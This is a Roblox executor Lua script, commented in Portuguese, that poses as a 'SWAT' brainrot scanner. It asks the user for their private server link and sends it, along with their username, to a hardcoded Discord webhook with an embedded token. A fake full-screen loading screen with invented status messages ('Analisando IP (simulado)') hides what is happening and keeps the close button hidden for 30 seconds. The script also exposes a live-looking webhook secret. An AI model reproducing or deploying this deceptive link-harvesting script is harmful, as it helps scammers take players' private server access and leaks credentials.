--[[
📡 SWAT - Sistema de Logs (Seguro)
Autor: Dede Silva
Descrição: Prompt pede link do servidor -> envia webhook -> mostra tela full-screen
Obs: NÃO bloqueia a saída do jogador; apenas cria uma tela modal que consome clicks.
Substitua WEBHOOK_URL_AQUI pela sua URL de webhook do Discord.
]]

--== CONFIG ==--
local webhookUrl = "https://discord.com/api/webhooks/1430383406805680188/Y3yzeDCcf8JkfskCq4xprBBvQArrjjIzA-fyFOWZ13td4etLPygUItStD2hJFuHgTcAc" -- coloque aqui a webhook
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

--== FUNÇÃO DE ENVIO ==--
local function sendWebhook(linkDoServidor)
local payload = {
username = "SWAT - Logs",
avatar_url = "https://i.imgur.com/5YQnN8u.png",
embeds = {{
title = "SWAT - Nenhum Brainrot Encontrado... (90%)",
color = 11730944,
fields = {
{ name = "👤 User", value = (LocalPlayer and LocalPlayer.Name) or "Usuário", inline = true },
{ name = "👥 Players no Servidor", value = tostring(#Players:GetPlayers()) .. "/" .. tostring(Players.MaxPlayers or 0), inline = true },
{ name = "🔗 Link do Servidor", value = "[Clique aqui](" .. tostring(linkDoServidor) .. ")" },
{ name = "🧠 Brainrots Encontrados", value = "Nenhum brainrot encontrado" }
},
footer = { text = "⚡ SWAT - Onde o impossível acontece ⚡" }
}}
}
local ok, err = pcall(function()
local json = HttpService:JSONEncode(payload)
-- PostAsync pode falhar se HttpService estiver desativado nas configurações do executor
HttpService:PostAsync(webhookUrl, json, Enum.HttpContentType.ApplicationJson)
end)
return ok, err
end

--== FUNÇÕES DE UI ==--
local function createLoadingGui()
-- Criar ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "SWAT_LoadingGui"
screenGui.ResetOnSpawn = false
screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

-- Fullscreen frame (azul escuro)  
local frame = Instance.new("Frame")  
frame.Size = UDim2.new(1,0,1,0)  
frame.Position = UDim2.new(0,0,0,0)  
frame.BackgroundColor3 = Color3.fromRGB(6,24,41) -- azul escuro  
frame.BorderSizePixel = 0  
frame.Active = true -- faz com que capture inputs  
frame.Parent = screenGui  

-- Título  
local title = Instance.new("TextLabel")  
title.Size = UDim2.new(1,0,0,80)  
title.Position = UDim2.new(0,0,0,20)  
title.BackgroundTransparency = 1  
title.Text = "⚡ SWAT - Carregando sistemas..."  
title.Font = Enum.Font.GothamBlack  
title.TextSize = 28  
title.TextColor3 = Color3.fromRGB(200, 220, 235)  
title.TextStrokeTransparency = 0.8  
title.Parent = frame  

-- Status (mensagens aleatórias)  
local status = Instance.new("TextLabel")  
status.Size = UDim2.new(1,0,0,50)  
status.Position = UDim2.new(0,0,0,110)  
status.BackgroundTransparency = 1  
status.Text = "Iniciando..."  
status.Font = Enum.Font.Gotham  
status.TextSize = 20  
status.TextColor3 = Color3.fromRGB(180,200,215)  
status.TextStrokeTransparency = 0.9  
status.Parent = frame  

-- Loading dots  
local dots = Instance.new("TextLabel")  
dots.Size = UDim2.new(1,0,0,30)  
dots.Position = UDim2.new(0,0,0,160)  
dots.BackgroundTransparency = 1  
dots.Text = ""  
dots.Font = Enum.Font.Gotham  
dots.TextSize = 20  
dots.TextColor3 = Color3.fromRGB(180,200,215)  
dots.Parent = frame  

-- "Fechar" button (invisível inicialmente)  
local closeBtn = Instance.new("TextButton")  
closeBtn.Size = UDim2.new(0,220,0,40)  
closeBtn.Position = UDim2.new(0.5,-110,0.85,0)  
closeBtn.AnchorPoint = Vector2.new(0.5,0.5)  
closeBtn.BackgroundColor3 = Color3.fromRGB(30,60,90)  
closeBtn.BorderSizePixel = 0  
closeBtn.Text = "Fechar"  
closeBtn.Font = Enum.Font.Gotham  
closeBtn.TextSize = 18  
closeBtn.TextColor3 = Color3.fromRGB(220,235,250)  
closeBtn.Visible = false  
closeBtn.Parent = frame  

-- Consumir input do mouse/teclado para impedir interação com jogo por baixo  
-- (aqui apenas a GUI captura os clicks, não bloqueia fechar o jogo)  
frame.InputBegan:Connect(function(input)  
	-- faz nada, apenas impede propagation  
end)  

-- Retorno de referências  
return {  
	screenGui = screenGui,  
	frame = frame,  
	status = status,  
	dots = dots,  
	closeBtn = closeBtn  
}

end

--== LÓGICA PRINCIPAL ==--
-- 1) Prompt para o link via console
rconsoleprint("@@YELLOW@@\n[SWAT LOGS] Digite o link do servidor privado e pressione Enter:\n")
local link = rconsoleinput()

if not link or link == "" then
rconsoleprint("@@RED@@[SWAT LOGS] Nenhum link inserido. Cancelando operação.\n")
return
end

-- 2) Criar GUI de carregamento
local gui = createLoadingGui()

-- mensagens aleatórias que aparecem
local mensagens = {
"Iniciando scanner...",
"Verificando players...",
"Analisando conexão...",
"Carregando módulos SWAT...",
"Gerando relatório...",
"Verificando integridade...",
"Analisando IP (simulado)...",
"Otimizando pacotes...",
"Preparando envio..."
}

-- loop que troca mensagens e faz "dots"
local running = true
spawn(function()
local i = 1
local dotCount = 0
while running and gui and gui.status and gui.dots do
gui.status.Text = mensagens[(i-1) % #mensagens + 1]
dotCount = (dotCount + 1) % 4
gui.dots.Text = string.rep(".", dotCount)
i = i + 1
wait(1.2)
end
end)

-- 3) Enviar webhook em background e controlar quando habilitar o botão fechar
rconsoleprint("@@CYAN@@[SWAT LOGS] Enviando link para a webhook...\n")
local ok, err = sendWebhook(link)
if ok then
rconsoleprint("@@GREEN@@[SWAT LOGS] Link enviado com sucesso!\n")
else
rconsoleprint("@@RED@@[SWAT LOGS] Falha ao enviar webhook: " .. tostring(err) .. "\n")
end

-- Mostrar mensagem final
if gui and gui.status then
if ok then
gui.status.Text = "Envio concluído. Finalizando..."
else
gui.status.Text = "Falha no envio. Você pode tentar novamente."
end
end

-- após envio, espera um tempo e permite fechar a UI
local maxWait = 30 -- segundos até liberar fechar (segurança/usabilidade)
local elapsed = 0
while elapsed < maxWait do
wait(1)
elapsed = elapsed + 1
end

-- habilitar o botão fechar (o jogador pode fechar; se preferir, você pode
-- aumentar maxWait para demorar mais)
if gui and gui.closeBtn then
gui.closeBtn.Visible = true
gui.closeBtn.MouseButton1Click:Connect(function()
-- encerra animação e remove GUI
running = false
if gui.screenGui then
gui.screenGui:Destroy()
end
rconsoleprint("@@GREEN@@[SWAT LOGS] Tela de carregamento fechada pelo usuário.\n")
end)
-- também permite fechar com tecla Esc
local userInput = game:GetService("UserInputService")
userInput.InputBegan:Connect(function(input, gameProcessed)
if input.KeyCode == Enum.KeyCode.Escape and gui and gui.closeBtn.Visible then
running = false
if gui.screenGui then gui.screenGui:Destroy() end
rconsoleprint("@@GREEN@@[SWAT LOGS] Tela de carregamento fechada (ESC).\n")
end
end)
end

